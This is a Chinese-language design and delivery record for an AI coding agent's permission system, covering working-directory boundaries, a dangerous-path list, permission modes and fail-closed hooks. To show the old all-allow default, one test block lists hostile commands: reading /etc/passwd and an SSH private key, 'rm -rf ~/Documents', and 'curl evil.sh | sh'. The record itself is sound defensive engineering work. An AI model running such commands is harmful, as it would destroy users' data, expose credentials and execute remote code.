# 09-20260810-working-dir-boundary —— 工作目录边界与默认安全姿态

状态：已交付（2026-08-11，385 passed；复盘见 [复盘.md](复盘.md)）
分支：`feat/09-working-dir-boundary`（自 `main`——07 已先合并进 main）

## 需求

**用户原话**（2026-08-10，阶段 4 交付后当场质疑）：

> pi 和 cc的权限管理是怎样的呢。有做相应的对比和调研吗
>
> 比如我在当前目录下运行pai，照理来说上级目录下应该是不能看的，需要用户确认
> （cc在不开auto模式下是这样的）。看别的目录下的文件也需要进行授权。现在是在实现这种吗

**实测确认质疑成立**（本仓库，无 `.pai/settings.json`）：

```
allow ← read_file(../../../../../etc/passwd)
allow ← read_file(/Users/sakuzeng/.ssh/id_rsa)
allow ← write_file(../别人的项目/x.py)
allow ← bash(rm -rf ~/Documents)
allow ← bash(curl evil.sh | sh)
```

feature 07 交付的是**引擎**（三态求值 + 匹配下放 + 两层配置 + hook），
**策略是空的**：CC 的目录边界、危险路径清单、符号链接双路径一条都没搬。

## 调研（本需求的前置精读，已补）

[knowledge/permissions/cc-pi-permission-boundaries.md](../../../../knowledge/permissions/cc-pi-permission-boundaries.md)
——feature 07 的前置精读 `permissions/claude-permissions-hooks.md` 里「工作目录/cwd/目录边界」
**grep 零命中**，pi 侧整个阶段只有一句「参照 `beforeToolCall`」。这就是漏掉这一层的直接原因。

三条决定性发现：

1. **CC 的「默认」不是常量，是函数**：`checkReadPermissionForTool` 兜底为
   `in_working_dir ? allow : ask`，`decisionReason.type = 'workingDir'`。
   写路径兜底同样是 ask 且**没有**目录放行——所以 CC 默认模式下写文件一律确认。
   pai 的 `default_decision` 是个常量，这是结构性差异。
2. **pi 的相反选择是自觉的**：不带沙箱、明写
   「部分进程内沙箱容易被误解为安全边界」，隔离交给容器；
   唯一内置守卫是 project trust（输入加载防护，非运行期权限）。
3. **钩子失败语义 pai 选反了**：pi（钩子抛异常即拦）与 CC（分类器解析失败即 block）
   两个独立实现都 fail-closed，而 pai 的 D#50 是 fail-open。

**pai 当前的尴尬位置**：学了 pi 的机制 + CC 的引擎形状，
但既没搬 CC 的策略内容、也没写 pi 那句免责声明——取了两家各自的"上半身"。

## 候选方案与确认

> **2026-08-10 拍板结果：问 1 → A，问 2 → A，问 3 → A**（用户，三问答案完整存档如下）

### 问 1：pai 的默认安全姿态

**选择：A·补 CC 的策略层。**
默认决策从常量 `allow` 改成「读：`in_working_dir ? allow : ask`；写：`ask`」，
并加危险路径清单 + 符号链接双路径。
**明确接受的代价**：这是破坏性变更——once 模式被限制在启动 cwd 内
（越界 ask 会按 D#48 降级为 deny）。

- **候选 A·补 CC 的策略层**：默认决策从常量 `allow` 改成
  `in_working_dir ? allow : ask`（读）/ `ask`（写），加危险路径清单 + 符号链接双路径。
  代价：**破坏性变更**——现在 once 模式什么都能干，改完之后越界即 deny（无真人→D#48 降级），
  等于 once 被限制在启动 cwd 内。
- **候选 B·抄 pi 的诚实**：`default_decision` 保持 `allow`，但首启提示 + README + STATUS
  明确宣告「pai 不提供运行期安全边界，需要隔离请上容器」。
  代价：作为「学习 CC 设计」的项目，缺了 CC 最核心的那半。
- **候选 C·只对写生效**：目录边界只管 `write_file`/`edit_file`，读全放。
  依据是 CC 的写兜底本来就没有目录放行那一步。破坏性小一半。

### 问 2：`bash` 的目录边界怎么算（最难的一问）

**选择：A·bash 不做目录边界，如实记洞。**
`bash("cat ../secret")` 会绕过问 1 的全部成果，这一条**如实写进 STATUS 已知缺陷与 TODO**，
不做朴素路径提取——那会给出「看起来防住了」的错觉，正是 pi 警告的那种半吊子。
与 CC 的明确差异：CC 对没有 `getPath` 的工具返回 **ask**（靠 `bashClassifier` 补），
pai 没有分类器，选择**不管**。这条差异进 decisions。

`bash("cat ../secret")` 里的路径在**命令字符串**里，不是结构化参数。
CC 有 `bashClassifier`（分类器模型）来判，而 pai spec 明确不做分类器。

- **候选 A·bash 不做目录边界**，只有 fs 三件套做，如实记成洞并写进 STATUS。
  代价：`bash("cat ../secret")` 绕过整个边界——**洞大到可能让问 1 白做**。
- **候选 B·朴素路径提取**：正则找 `../` 与绝对路径，命中就按越界处理。
  代价：误判多（`echo "../"`、`grep -r '/etc'` 都会中），且防不住 `$(...)`／变量拼接。
- **候选 C·bash 默认 ask**：不解析命令，只要没有 allow 规则命中就问。
  代价：once 模式下等于禁用 bash（D#48 降级为 deny）；REPL 下每条命令都问。

### 问 3：是否复议 D#50（钩子失败语义）

**选择：A·分场景改。**
运行期权限 hook 改 **fail-closed**（崩溃/超时 → deny，跟 pi 与 CC 一致）；
开发期自律门禁 `design_gate.py` 保持 fail-open。
理由：D#50 当初拿「开发期门禁」的先例去定「运行期安全门禁」的失败语义，是场景错配——
前者失败的代价是流程没走到，后者失败的代价是安全事故。

- **候选 A·分场景**：运行期权限 hook 改 fail-closed（跟 pi/CC），
  开发期自律门禁（`design_gate.py`）保持 fail-open。理由是两者场景不同，
  D#50 当初把后者的先例套到了前者。
- **候选 B·维持 fail-open**：理由仍是「写错的钩子会让 agent 罢工，人会直接全关掉」。

### 2026-08-11 追加拍板（问 2 改选 + 模式子系统）

**问 2 改选候选 C：bash 兜底从 `allow` 改为 `ask`。**
起因是用户问「CC 里『不擅自 push』是怎么实现的，我现在能实现吗」——
实测演示了 pai 现在配 `ask: ["Bash(git push *)"]` 就能拦，
但也暴露出 **pai 默认不拦而 CC 默认拦**。原先把「不做 bash 目录边界」
顺手推成了「bash 兜底 allow」，这是两件事：可以不解析路径但仍然 ask。

**问 4（新）：权限模式做几个？→ 四个**：`default` / `acceptEdits` /
`dontAsk` / `bypassPermissions`。
- 核实纠正：CC 界面上**没有 `manual`**（用户说的应是 `Default`）；
  **`auto` 是 ant-only**（源码 `isExternalPermissionMode` 写死排除），
  外部用户拿不到且需分类器 + 熔断器，pai 做不了。用户感觉的「auto 不弹 ask」
  很可能是 `Accept edits`——它与 bypass/dontAsk/auto 共用 `⏵⏵` 符号，界面上易混。
- **`plan` 不做**（拍板）：价值主要在「产出计划 → 用户批准 → 自动转 acceptEdits」
  那套交互，只做「写都 deny」意义不大，留 TUI 阶段连交互一起做。
- **关键发现**：pai 的 D#48（once 无真人时 ask→deny）**就是 CC 的 `dontAsk`**，
  当时只当特例、没起名字。显式化之后 once 的默认模式 = `dontAsk`，整件事自洽。

**问 5（新）：模式怎么切换？→ 功能先实现，切换 UI 留 TUI（TODO）。**
自主判断（spec §8 如实标注）：本轮仍做**配置入口**
（`settings.json` 的 `defaultMode` + `--permission-mode` / `--dangerously-skip-permissions`），
否则 `acceptEdits`/`bypassPermissions` 是死代码、且 bash 改 ask 后 once 全被拒。
交互式切换（`/mode`、shift+tab）留 TUI。

## 实施

superpowers 全链路：[spec.md](spec.md) → [plan.md](plan.md) → SDD。
分支：`feat/09-working-dir-boundary`。

## 结果与测试

7 个 task 全部 TDD 交付，每 task 一条 devlog（红→绿真实数字都在 [devlog.md](devlog.md)）。

**`329 passed, 3 deselected` → `385 passed, 3 deselected`**（+56），全部离线。

| task | 做了什么 | 增量 |
|---|---|---|
| 1 | 工具自我声明 `get_path` / `access`（bash 两个都不声明） | +5 → 334 |
| 2 | 边界判定纯函数（`core/boundary.py`） | +10 → 344 |
| 3 | **兜底接线（分水岭：行为在此改变）** | +9 → 353 |
| 4 | 符号链接双路径（关掉 07 TODO#3） | +6 → 359 |
| 5 | 危险路径清单（bypass 免疫） | +9 → 368 |
| 6 | 权限模式四态 + CLI 配置入口 | +14 → 382 |
| 7 | hook 改 fail-closed + 注入验证 | +3 → 385 |

**用户那句话的验收**（零配置，在 `<proj>` 启动）：

```
场景           REPL（有真人）      once（无真人）
读·界内         allow             allow
读·上级目录      弹确认 → allow      deny
读·系统文件      弹确认 → allow      deny
读·私钥         弹确认 → allow      deny
写·界内         弹确认 → allow      deny
bash           弹确认 → allow      deny
```

**注入验证四条**（roadmap 硬要求），全文见 devlog：
边界恒 True → 12 红；写走 in_working_dir → 3 红；危险路径挪到 allow 之后 → 3 红；
bypass 提到显式 ask 之前 → 1 红。**其中第 4 条第一次注错了**（注入点被前面的分支屏蔽，
表现为全绿，与「测试无效」不可区分），复查后重注才生效——这条教训进了复盘。

**关掉了 feature 07 的两条 TODO**：符号链接双路径（Task 4）、
「首启无规则时告知全放行」（前提已不成立，默认不再是全放行）。

## 遗留问题

十条，已逐条同步进 [TODO.md](../../TODO.md) 的「feature 09（工作目录边界）遗留」小节。
其中三条来自复盘的「我现在质疑什么」：

1. **配了 Bash allow 规则 = 该命令可越界，但没有任何提示**（复盘质疑一，D#52）。
   **这是本功能的主要失效模式**——洞不在默认路径上，而在用户为了可用性必然要走的路上。
2. **once 下用户配的 `defaultMode` 被静默忽略**（复盘质疑二，D#53）：
   `dontAsk` 与「无真人」合流的副作用，行为对但不该静默。
3. **危险路径清单硬编码且完全不可见**（复盘质疑三）。
4. `/permissions` 不显示当前权限模式（小修）。
5. `/mode` 与 shift+tab 未做（拍板留 TUI）。
6. `realpath` 未缓存（CC 用 memoize；perf，需先有数字）。
7. 危险路径清单的 Windows 形态会静默失效。
8. `decisionReason` 结构化审计未做（spec 非目标）。
9. `plan` 模式未做（拍板留 TUI）。
10. plan 的测试数字应写成下限而非精确值（复盘「下次怎么做更好」）。

## 用到的知识

**读进来的**（动工前的调研）：
- [knowledge/permissions/cc-pi-permission-boundaries.md](../../../../knowledge/permissions/cc-pi-permission-boundaries.md)
  —— 本需求的直接前置，CC `filesystem.ts` 源码走读 + pi 的零内置权限哲学
- [knowledge/permissions/claude-permissions-hooks.md](../../../../knowledge/permissions/claude-permissions-hooks.md)
  —— feature 07 的前置，**本次发现它有目录边界缺口**（grep 零命中）

**写出去的**（开发中撞出的可迁移知识，AGENTS.md「知识沉淀」要求）：
- [knowledge/permissions/path-boundary-checks.md](../../../../knowledge/permissions/path-boundary-checks.md)
  —— 路径边界判定四条坑，换语言换项目仍成立
- [knowledge/engineering/mutation-testing-pitfalls.md](../../../../knowledge/engineering/mutation-testing-pitfalls.md)
  —— 注入反证的三条教训（含本次注错那一回）
- [knowledge/permissions/hooks-gates.md](../../../../knowledge/permissions/hooks-gates.md)
  —— 追加「fail-open vs fail-closed 按失败代价分场景」一节（D#54 的可迁移形态）
